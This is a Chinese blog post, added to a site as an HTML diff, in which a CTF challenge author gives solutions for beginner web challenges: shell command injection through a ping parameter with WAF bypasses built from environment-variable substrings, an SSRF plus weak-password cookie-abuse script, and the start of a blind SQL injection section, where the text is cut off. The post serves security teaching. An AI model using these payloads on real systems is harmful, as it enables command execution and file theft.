@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="给大二出了点简单题玩玩。感觉做得还彳亍，有点意思。 Web-你在扫尼玛的东方明珠塔扫呢你本题主要考察 shell 命令执行的一些小技巧，偏简单题。给出了题目附件 flag.sh： 1234567#!&#x2F;usr&#x2F;bin&#x2F;env bashecho $FLAG &gt; &#x2F;flagexport FLAG&#x3D;not_flagFLAG&#x3D;not_flagapache2-foreground  这里主要是提示 fl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XPCTF@HUT 出题笔记">
+<meta property="og:url" content="http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="歪比巴卜">
+<meta property="og:description" content="给大二出了点简单题玩玩。感觉做得还彳亍，有点意思。 Web-你在扫尼玛的东方明珠塔扫呢你本题主要考察 shell 命令执行的一些小技巧，偏简单题。给出了题目附件 flag.sh： 1234567#!&#x2F;usr&#x2F;bin&#x2F;env bashecho $FLAG &gt; &#x2F;flagexport FLAG&#x3D;not_flagFLAG&#x3D;not_flagapache2-foreground  这里主要是提示 fl">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-10-16T12:38:22.000Z">
+<meta property="article:modified_time" content="2021-10-31T03:48:21.107Z">
+<meta property="article:author" content="Du1L0v3">
+<meta property="article:tag" content="WriteUp">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>XPCTF@HUT 出题笔记</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<!--
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+-->
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2021/10/16/2021-ByteCTF-WP/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2021/09/20/%E8%AE%BA%E4%BB%8E%E9%AB%98%E6%A1%A3%E9%A4%90%E5%8E%85%E5%88%B0%E8%A1%97%E5%A4%B4%E5%B0%8F%E5%90%83%E7%9A%84%E5%A5%87%E5%A6%99%E4%B8%80%E6%99%9A/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&text=XPCTF@HUT 出题笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&title=XPCTF@HUT 出题笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&is_video=false&description=XPCTF@HUT 出题笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XPCTF@HUT 出题笔记&body=Check out this article: http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&title=XPCTF@HUT 出题笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&title=XPCTF@HUT 出题笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&title=XPCTF@HUT 出题笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&title=XPCTF@HUT 出题笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&name=XPCTF@HUT 出题笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/&t=XPCTF@HUT 出题笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E4%BD%A0%E5%9C%A8%E6%89%AB%E5%B0%BC%E7%8E%9B%E7%9A%84%E4%B8%9C%E6%96%B9%E6%98%8E%E7%8F%A0%E5%A1%94%E6%89%AB%E5%91%A2%E4%BD%A0"><span class="toc-number">1.</span> <span class="toc-text">Web-你在扫尼玛的东方明珠塔扫呢你</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8C%E5%9C%A3"><span class="toc-number">2.</span> <span class="toc-text">Web-重生之我是赌圣</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%F0%9F%91%B4%E5%A6%82%E4%BD%95%E8%8A%B1%E5%BF%92%E5%A5%B6%E5%A5%B6%E7%9A%84%E4%B8%80%E5%A4%A9%E9%80%83%E7%A6%BB%E7%9B%91%E7%8B%B1"><span class="toc-number">3.</span> <span class="toc-text">Web-👴如何花忒奶奶的一天逃离监狱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C%E7%9A%84-ez-nc"><span class="toc-number">4.</span> <span class="toc-text">PWN-有手就行的 ez_nc</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        XPCTF@HUT 出题笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Du1L0v3</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-10-16T12:38:22.000Z" itemprop="datePublished">2021-10-16</time>
+        
+        (Updated: <time datetime="2021-10-31T03:48:21.107Z" itemprop="dateModified">2021-10-31</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>给大二出了点简单题玩玩。感觉做得还彳亍，有点意思。</p>
+<h2 id="Web-你在扫尼玛的东方明珠塔扫呢你"><a href="#Web-你在扫尼玛的东方明珠塔扫呢你" class="headerlink" title="Web-你在扫尼玛的东方明珠塔扫呢你"></a>Web-你在扫尼玛的东方明珠塔扫呢你</h2><p>本题主要考察 shell 命令执行的一些小技巧，偏简单题。给出了题目附件 flag.sh：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line">echo $FLAG &gt; /flag</span><br><span class="line"></span><br><span class="line">export FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line">apache2-foreground</span><br></pre></td></tr></table></figure>
+
+<p>这里主要是提示 flag 在 /flag 以及提示环境变量中有 FLAG 可以用</p>
+<p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Author: Du1L0v3</span></span><br><span class="line"><span class="comment"> * Description: 就这？李在嗦泥🐎呢，真是麻雀啄🐂丁丁，雀食牛逼</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cnm</span> = file_get_contents(<span class="string">&quot;/flag.sh&quot;</span>);</span><br><span class="line"><span class="variable">$nmsl</span> = str_replace(<span class="string">&quot;apache2-foreground&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$cnm</span>);</span><br><span class="line">shell_exec(<span class="variable">$nmsl</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]| |BASH|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|~|\!|\=|\^|\*|#|%|\&gt;|\&lt;|\&#x27;|\&quot;|\`|_|\,/&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="variable">$res</span> = shell_exec(<span class="string">&quot;bash -c &#x27;ping &quot;</span> . <span class="variable">$url</span> . <span class="string">&quot; -c 1&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (strstr(<span class="variable">$res</span>, <span class="string">&quot;flag&quot;</span>) || strstr(<span class="variable">$res</span>, <span class="string">&quot;xpctf&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;why you so vegetable&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you want to do what?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;wai bi ba bo&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要需要考虑如何去闭合 <code>bash -c &#39;ping &quot; . $url . &quot; -c 1&#39;</code> 以及闭合之后如何绕过 WAF 执行命令</p>
+<p>首先不考虑存在 WAF 可以轻松构造出：<code>url=127.0.0.1|ls%26ping 127.0.0.1</code>（&amp; 需要 urlencode 为 %26）</p>
+<p>这样构造就使两头闭合，从而可以在中间执行任意命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 | ls &amp; ping 127.0.0.1 -c 1</span><br></pre></td></tr></table></figure>
+
+<p>但是我们的小写字母被过滤了，不过大写字母和数字没有被过滤，所以可以尝试利用环境变量截取关键字符来拼接命令：（因为输出如果有 flag 或者 xpctf 字符串就会过滤，所以我们需要用 base64 输出，也可以用 rev）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">空格: $IFS$9</span><br><span class="line">/: $&#123;PATH:0:1&#125;</span><br><span class="line">/bin/ls: $&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span><br><span class="line">/usr/bin/base64: $&#123;PATH:0:5&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:12:1&#125;???64</span><br><span class="line">/bin/cat: $&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;FLAG:6:1&#125;$&#123;FLAG:2:1&#125;</span><br><span class="line">/flag: $&#123;PATH:0:1&#125;$&#123;FLAG:4:4&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拼接得到：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls / | base64</span><br><span class="line">127.0.0.1|$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;$IFS$9$&#123;PATH:0:1&#125;|$&#123;PATH:0:5&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:12:1&#125;???64%26$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;PATH:13:2&#125;$&#123;FLAG:7:1&#125;$IFS$9127.0.0.1</span><br><span class="line">cat /flag  | base64</span><br><span class="line">127.0.0.1|$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;FLAG:6:1&#125;$&#123;FLAG:2:1&#125;$IFS$9$&#123;PATH:0:1&#125;$&#123;FLAG:4:4&#125;|$&#123;PATH:0:5&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:12:1&#125;???64%26$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;PATH:13:2&#125;$&#123;FLAG:7:1&#125;$IFS$9127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>才发现不要构造 ping 闭合后面的，我是傻逼。。</p>
+<p>可以适当做一下拓展，把 WAF 稍微换一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]| |FLAG|HOME|PWD|PATH|MAIL|LANG|BASH|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|HOSTNAME|EUID|LANG|LESSOPEN|LINES|OLD|MACHTYPE|PPID|SHLVL|FUNCNAME|OPTIND|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|#|%|\&gt;|\&lt;|\&#x27;|\&quot;|\`|_|\,/&#x27;</span>, <span class="variable">$url</span>)</span><br></pre></td></tr></table></figure>
+
+<p>也没啥，就把数字过滤了，再加上过滤了点前面用到的啥 PATH、FLAG。。。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">OPTERR=1</span><br><span class="line">HOSTTYPE=x86_64</span><br><span class="line">UID=1001</span><br><span class="line">TERM=	</span><br><span class="line">EUID=0</span><br><span class="line">ID=0</span><br><span class="line">OSTYPE=linux-gnu</span><br><span class="line">LOGNAME=root</span><br><span class="line">SHELL=/sbin/nologin</span><br><span class="line">SHELLOPTS=braceexpand:hashall:interactive-comments:posix</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">OPTERR = 1</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;UID:<span class="variable">$OPTERR</span>:<span class="variable">$OPTERR</span>&#125; = 0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;HOSTTYPE:<span class="variable">$OPTERR</span>:OPTERR&#125; = 8</span></span><br><span class="line"></span><br><span class="line">空格 -&gt; $&#123;IFS&#125;</span><br><span class="line">/ -&gt; $&#123;SHELL::$OPTERR&#125;</span><br><span class="line">l -&gt; $&#123;OSTYPE::$OPTERR&#125;</span><br><span class="line">i -&gt; $&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span><br><span class="line">d -&gt; $&#123;TERM::$OPTERR&#125;</span><br><span class="line">u -&gt; $&#123;OSTYPE:~A:$OPTERR&#125;</span><br><span class="line">1</span><br><span class="line">0</span><br><span class="line">8</span><br><span class="line">4 -&gt; $&#123;HOSTTYPE:~A:$OPTERR&#125;</span><br><span class="line">x</span><br><span class="line">r -&gt; $&#123;LOGNAME::$OPTERR&#125;</span><br><span class="line">n -&gt; $&#123;SHELL:~A:$OPTERR&#125;</span><br><span class="line">b -&gt; $&#123;SHELLOPTS::$OPTERR&#125;</span><br><span class="line">s -&gt; $&#123;HISTCONTROL:~A:$OPTERR&#125;</span><br><span class="line">t -&gt; $&#123;LOGNAME:~A:$OPTERR&#125;</span><br><span class="line"></span><br><span class="line">1.1 -&gt; $OPTERR.$OPTER</span><br><span class="line">/bin/ -&gt; /?i?/ -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;</span><br><span class="line">/bin/dir -&gt; /?i?/di? -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;TERM::$OPTERR&#125;$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?</span><br><span class="line">/usr/bin/ -&gt; /u??/?i?/ -&gt; $&#123;SHELL::$OPTERR&#125;$&#123;OSTYPE:~A:$OPTERR&#125;??$&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;</span><br><span class="line">/usr/bin/base64 -&gt; /usr/bin/b?s??4 -&gt; $&#123;SHELL::$OPTERR&#125;$&#123;OSTYPE:~A:$OPTERR&#125;??$&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;SHELLOPTS::$OPTERR&#125;????$&#123;HOSTTYPE:~A:$OPTERR&#125;</span><br><span class="line">/bin/tac -&gt; /?i?/t?? -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;LOGNAME:~A:$OPTERR&#125;??</span><br><span class="line">/bin/nl -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;SHELL:~A:$OPTERR&#125;$&#123;OSTYPE::$OPTERR&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为没了数字，所以没办法用 127.0.0.1 了。。可以随便糊弄个 1.1，简单构造一波：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/bin/dir / | base64</span><br><span class="line"><span class="meta">$</span><span class="bash">OPTERR.<span class="variable">$OPTERR</span>|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;TERM::$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;IFS&#125;</span><span class="variable">$&#123;SHELL::$OPTERR&#125;</span>|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE:~A:$OPTERR&#125;</span>??<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;SHELLOPTS::$OPTERR&#125;</span>????<span class="variable">$&#123;HOSTTYPE:~A:$OPTERR&#125;</span>%26</span></span><br><span class="line">/bin/nl /flag | base64</span><br><span class="line"><span class="meta">$</span><span class="bash">OPTERR.<span class="variable">$OPTERR</span>|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;SHELL:~A:$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE::$OPTERR&#125;</span><span class="variable">$&#123;IFS&#125;</span><span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE::$OPTERR&#125;</span>??|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE:~A:$OPTERR&#125;</span>??<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;SHELLOPTS::$OPTERR&#125;</span>????<span class="variable">$&#123;HOSTTYPE:~A:$OPTERR&#125;</span>%26</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Web-重生之我是赌圣"><a href="#Web-重生之我是赌圣" class="headerlink" title="Web-重生之我是赌圣"></a>Web-重生之我是赌圣</h2><p>考察写脚本的能力，考点：</p>
+<ul>
+<li>ssrf + 弱密码</li>
+<li>利用赌场Cookie存储漏洞</li>
+</ul>
+<p>直接贴脚本吧，这题是最简单的了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b8a1bad7-9300-453d-88e2-ce7a5684cf65.node.oj.huts.ec/&quot;</span></span><br><span class="line">conn = requests.get(url=url + <span class="string">&quot;index.php?url=http://127.0.0.1/login.php?username=admin%26password=admin&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> conn.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;/var/www/html/fuck_chutiren.txt&quot;</span>)</span><br><span class="line">conn = requests.post(url=url + <span class="string">&quot;main.php&quot;</span>)</span><br><span class="line">cook = conn.cookies</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn = requests.post(url=url + <span class="string">&quot;main.php&quot;</span>, cookies=cook)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xpctf&#123;&quot;</span> <span class="keyword">in</span> conn.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;险胜&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(conn.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;恭喜&quot;</span> <span class="keyword">in</span> conn.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;芜湖&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(conn.cookies[<span class="string">&#x27;num&#x27;</span>])</span><br><span class="line">        <span class="comment"># print(conn.text)</span></span><br><span class="line">        cook = conn.cookies</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Web-👴如何花忒奶奶的一天逃离监狱"><a href="#Web-👴如何花忒奶奶的一天逃离监狱" class="headerlink" title="Web-👴如何花忒奶奶的一天逃离监狱"></a>Web-👴如何花忒奶奶的一天逃离监狱</h2><p>这题挺有意思的，本来是源自我和室友一起写的一个学习项目——“监狱管理系统”，不过👴偷偷在注册的后端溜了一个无伤大雅的小洞，一开始自己测试的时候是一直在尝试报错注入，然后写入文件读取，然后一直失败，最后去找了谭总聊了下，发现还是思维局限了，一直想着要报错写文件，忘了可以时间盲注，脑子卡了卡了。后面和🍋聊天的时候，🍋说了句贼有道理的话：“你总不能让别人一边写入数据一边导出数据吧”，最后就放弃了傻逼报错注入，顺带设了个小坑，将我报错注入测试中用过的 payload 放到了 robots.txt 里面，不过也提示了后面的双注入。</p>
+<p>直接贴脚本好了：</p>
